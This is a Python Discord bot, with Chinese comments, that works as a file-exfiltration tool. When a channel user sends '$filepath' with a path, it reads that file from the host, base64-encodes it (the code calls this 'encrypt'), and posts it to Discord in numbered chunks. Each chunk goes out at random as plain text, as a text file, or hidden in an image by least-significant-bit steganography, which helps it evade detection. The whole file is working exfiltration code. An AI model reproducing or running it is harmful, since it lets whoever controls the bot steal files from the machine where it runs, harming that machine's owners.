import os
import random
import discord
import base64
from PIL import Image
from io import BytesIO

intents = discord.Intents.default()
intents.message_content = True

client = discord.Client(intents=intents)

def encrypt(input_string):
    """加密字符串为base64格式"""
    byte_data = input_string.encode('utf-8')
    base64_bytes = base64.b64encode(byte_data)
    base64_string = base64_bytes.decode('utf-8')
    return base64_string

def text_to_bin(text):
    """将文本转换为二进制字符串"""
    return ''.join([format(ord(i), '08b') for i in text])

def hide_text_in_image(text, chunk_number):
    """将文本嵌入到图片中"""
    img = Image.new('RGB', (100, 100), color=(73, 109, 137))
    encoded_img = img.copy()
    width, height = img.size
    bin_text = text_to_bin(f"{chunk_number}:{text}") + '1111111111111110'  # 结束标志符

    data_index = 0
    pixels = encoded_img.load()

    for i in range(height):
        for j in range(width):
            pixel = list(pixels[j, i])  # 获取像素的 RGB 值
            for n in range(3):  # 对 R, G, B 三个通道进行操作
                if data_index < len(bin_text):
                    pixel[n] = int(format(pixel[n], '08b')[:-1] + bin_text[data_index], 2)  # 替换最低有效位
                    data_index += 1
            pixels[j, i] = tuple(pixel)  # 更新像素

            if data_index >= len(bin_text):
                break
        if data_index >= len(bin_text):
            break

    img_bytes = BytesIO()
    encoded_img.save(img_bytes, format='PNG')
    img_bytes.seek(0)
    return img_bytes

async def send_base64_chunk(channel, chunk, chunk_number):
    method = random.choice(['text', 'image', 'file'])  # 随机选择传输方式

    # 给chunk附加块编号
    chunk_with_number = f"{chunk_number}:{chunk}"  # 将块编号与数据块一起发送

    if method == 'text':
        # 作为文本消息发送
        await channel.send(f"Here is chunk {chunk_number}: `{chunk_with_number}`")
    
    elif method == 'image':
        # 使用隐写术将块编号和数据嵌入到图片中
        img_bytes = hide_text_in_image(chunk, chunk_number)
        await channel.send(file=discord.File(img_bytes, f"image_chunk_{chunk_number}.png"), content=f"Chunk in image {chunk_number}")

    elif method == 'file':
        # 创建包含块的文本文件
        filename = f"chunk_{chunk_number}.txt"
        with open(filename, 'w') as f:
            f.write(chunk_with_number)  # 修复：文件内容与其他发送方式保持一致
        await channel.send(file=discord.File(filename))

@client.event
async def on_ready():
    print(f'We have logged in as {client.user}')

@client.event
async def on_message(message):
    if message.author == client.user:
        return

    if message.content.startswith('$filepath'):
        filepath = message.content.split(' ')[1]
        if os.path.exists(filepath):
            with open(filepath, 'r') as f:
                # 注意：这里不再直接分割原始文本，而是在加密后的Base64字符串上进行分割
                file_data = f.read()
                base64_data = encrypt(file_data)
                
                chunk_size = 50  # 每个消息块的大小
                chunk_number = 1  # 块编号起始值

                while base64_data:
                    chunk = base64_data[:chunk_size]
                    base64_data = base64_data[chunk_size:]
                    await send_base64_chunk(message.channel, chunk, chunk_number)  # 发送带编号的块
                    chunk_number += 1  # 更新块编号

                await send_base64_chunk(message.channel, "EOF", chunk_number)  # 发送EOF消息
        else:
            await message.channel.send(f'File not found: {filepath}')

client.run('your-remote-secret')
